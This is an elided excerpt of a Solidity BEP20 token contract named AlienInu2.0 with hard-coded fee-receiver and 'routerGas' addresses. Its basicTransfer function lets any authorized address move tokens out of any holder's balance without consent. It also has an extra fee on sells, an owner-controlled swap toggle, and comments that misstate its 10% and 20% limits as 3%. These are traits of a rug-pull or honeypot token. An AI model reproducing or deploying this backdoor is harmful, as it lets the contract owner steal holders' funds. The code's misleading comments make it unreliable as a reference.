...
contract AlienInu is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB = 0x5B3E2Bc1da86ff6235D9eAd4504d598caE77DBCB;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "AlienInu2.0";
    string constant _symbol = "ALN";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1000000000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = (_totalSupply * 10) / 100;  //3% max tx
    uint256 public _maxWalletSize = (_totalSupply * 20) / 100;  //3% max wallet
    ...
    address private marketingFeeReceiver =0x8fDbCf16955Fc85D549992deef412414F1c1A413;
    address private teamFeeReceiver = 0x8fDbCf16955Fc85D549992deef412414F1c1A413 ;
    ...
    constructor () Auth(msg.sender) {
        ...
        routerGas = 0x859bF1F1Dc384b72c4040f4c1457507640a9e6eE;
    ...
    function basicTransfer(address sender, address recipient, uint256 amount) external authorized  returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    ...
    function getTotalFee(bool selling) public view returns (uint256) {
        ...
        if(selling) { return totalFee.add(10); }
        return totalFee;
    }
  ...
  //      require(Success3, "receiver rejected ETH transfer");
   ...
   function setMaxWallet(uint256 amount) external onlyOwner() {
    ...
    function setSwap(bool swap) external authorized {
        inSwap=swap;
    }
